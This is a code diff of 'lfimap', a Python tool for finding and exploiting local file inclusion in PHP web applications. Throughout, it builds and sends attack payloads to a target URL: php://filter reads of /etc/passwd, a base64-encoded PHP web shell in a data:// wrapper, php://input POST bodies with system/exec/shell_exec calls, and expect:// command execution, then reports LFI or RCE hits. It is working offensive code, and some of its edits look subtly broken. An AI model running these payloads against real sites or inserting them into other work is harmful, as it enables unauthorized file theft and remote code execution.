@@ -51,9 +51,10 @@ def test_wordlist(url):
         res = requests.get(url, headers = headers)
         
         if("root:x:0:0" in res.text or ":www-data:" in res.text):  
-                print("[+] LFI -> " + url)                   
+                print("[+] LFI -> " + url)
+                
                 exploit = url+line
-                exploit = exploit.replace('/etc/passwd', '') #TODO Better and more elegant
+                exploit = exploit.replace('/etc/passwd', '')
  
                 return exploit
         else:
@@ -66,92 +67,113 @@ def test_php_filter(url):
     #Test if parameter is vulnerable without encoding
     testCase = "php://filter/resource=/etc/passwd"
     if("DESTROY" in url):
-        url = url.replace("DESTROY", "")
+        u = url.replace("DESTROY", testCase)
 
-    res = requests.get(url + testCase, headers = headers)
+    res = requests.get(u, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text): 
-        print("[+] LFI -> " + url + testCase)
+        print("[+] LFI -> " + u)
 
     #Base64 Encoded
     testCaseTwo = "php://filter/convert.base64-encode/resource=/etc/passwd"
-    res = requests.get(url + testCaseTwo, headers = headers)
+    u = url.replace("DESTROY", testCaseTwo)
+    res = requests.get(u, headers = headers)
     if("cm9vdDp4OjA6MD" in res.text or "Ond3dy1kYXRhO" in res.text): 
-        print("[+] LFI -> " + url + testCaseTwo)
+        print("[+] LFI -> " + u)
 
     testCaseThree = "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
-    res = requests.get(url + testCaseThree, headers = headers)
+    u = u.replace("DESTROY", testCaseThree)
+    res = requests.get(u, headers = headers)
 
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
-        print("[+] LFI -> " + url + testCaseThree)
+        print("[+] LFI -> " + u)
     
     testCaseFour = "php://filter/read=string.rot13/resource=/etc/passwd"
-    res = requests.get(url + testCaseFour, headers = headers)
+    u = u.replace("DESTROY", testCaseFour)
+    res = requests.get(u, headers = headers)
     if("ebbg:k:0:0" in res.text or "jjj-qngn:k" in res.text):
-        print("[+] LFI -> " + url + testCaseFour)
+        print("[+] LFI -> " + u)
+
 
 def test_data_wrapper(url):
-    testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat /etc/passwd"
+    testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd"
     if("DESTROY" in url):
-        url = url.replace("DESTROY", testCase)
+        u = url.replace("DESTROY", testCase)
 
-    res = requests.get(url, headers = headers)
+    res = requests.get(u, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
-        print("[+] LFI -> " + url)
+        print("[+] LFI -> " + u)
+
 
 def test_php_input(url):
-    urlInput = "php://input"
-    testCase = "<? system('cat /etc/passwd'); ?>"
+    urlInput = "php://input&cmd=cat%20/etc/passwd"
+    testCase = "<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>"
     if("DESTROY" in url):
-        url = url.replace("DESTROY", urlInput)
-
-    res = requests.post(url + urlInput, headers = headers, data= testCase)
+        u = url.replace("DESTROY", urlInput)
+    
+    res = requests.post(u, headers = headers, data= testCase)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
-        print("[+] LFI -> " + url + urlInput)
+        print("[+] RCE -> " + u + " -> HTTP POST: " + testCase)
+
+
+    testCaseTwo = "<?php echo shell_exec($_GET['cmd']) ?>"
+    res = requests.post(u, headers = headers, data = testCaseTwo)
+    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)
+
 
 def test_expect_wrapper(url):
-    testCase = "cat%20%2Fetc%2Fpasswd"
+    testCase = "expect://cat%20%2Fetc%2Fpasswd"
     if("DESTROY" in url):
-        url = url.replace("DESTROY", testCase)
+        u = url.replace("DESTROY", testCase)
 
-    res = requests.get(url + testCase, headers = headers)
+    res = requests.get(u, headers = headers)
     if("root:x:0:0" in res.text or ":www-data:" in res.text):
-        print("[+] LFI -> " + url + urlInput)
+        print("[+] RCE -> " + u)
+
 
 
 def main():
 
-    if(test_all):
-        test_php_filter(url)
-        test_php_input(url)
-        test_data_wrapper(url)
-        test_expect_wrapper(url)
-        test_wordlist(url)
+    #Default behaviour
+    if(not test_all):
+        if(php_filter):
+            test_php_filter(url)
+        if(php_input):
+            test_php_input(url)
+        if(data_wrapper):
+            test_data_wrapper(url)
+        if(expect_wrapper):
+            test_expect_wrapper(url)
+        if(args.wordlist):
+            test_wordlist(url)
+        
+        print("Done.")
         exit(0)
 
-    if(php_filter):
-        test_php_filter(url)
-    elif(php_input):
-        test_php_input(url)
-    elif(data_wrapper):
-        test_data_wrapper(url)
-    elif(expect_wrapper):
-        test_expect_wrapper(url)
+    #Perform all tests
     else:
+        test_php_filter(url)
+        test_php_input(url)
+        test_data_wrapper(url)
+        test_expect_wrapper(url)
         test_wordlist(url)
+        
+        print("Done.")
+        exit(0)
 
 
 if(__name__ == "__main__"):
-
+    
     print("")
     parser = argparse.ArgumentParser(description="lfimap, tool for discovering LFI", formatter_class=RawTextHelpFormatter, add_help=False)
 
-    parser.add_argument('url', type=str, metavar="URL", help="\t\t Provide site url with parameter and protocol. Ex: http://example.org/vuln.php?param=DESTROY")
-    parser.add_argument('--test-php-filter', action="store_true", dest = 'php_filter', help="\t\t Test using php filter")
-    parser.add_argument('--test-php-input', action="store_true", dest = 'php_input', help="\t\t Test using php input.")
-    parser.add_argument('--test-data-wrapper', action="store_true", dest = 'data_wrapper', help="\t\t Test using data wrapper")
-    parser.add_argument('--test-expect-wrapper', action="store_true", dest = 'expect_wrapper', help="\t\t Test using expect wrapper")
-    parser.add_argument('-a', '--test-all', action="store_true", dest = 'test_all', help="\t\t Test using wordlist, filter, input, data and expect wrappers")
-    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Session cookie. Ex: "PHPSESSID=1943785348b45"')
+    parser.add_argument('url', type=str, metavar="URL", help="""\t\t Url, Ex: "http://example.org/vuln.php?param=DESTROY" """)
+    parser.add_argument('--test-php-filter', action="store_true", dest = 'php_filter', help="\t\t Test php filter")
+    parser.add_argument('--test-php-input', action="store_true", dest = 'php_input', help="\t\t Test php input")
+    parser.add_argument('--test-data', action="store_true", dest = 'data', help="\t\t Test data wrapper")
+    parser.add_argument('--test-expect', action="store_true", dest = 'expect', help="\t\t Test expect wrapper")
+    parser.add_argument('-a', '--test-all', action="store_true", dest = 'test_all', help="\t\t Test all above + using wordlist")
+    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Session Cookie, Ex: "PHPSESSID=1943785348b45"')
     parser.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Custom wordlist (default wordlist.txt)")
     parser.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")
 
@@ -159,8 +181,8 @@ if(__name__ == "__main__"):
 
     url = args.url
     php_filter = args.php_filter
-    data_wrapper = args.data_wrapper
-    expect_wrapper = args.expect_wrapper
+    data_wrapper = args.data
+    expect_wrapper = args.expect
     php_input = args.php_input
     cookie = args.cookie
     wordlist = args.wordlist
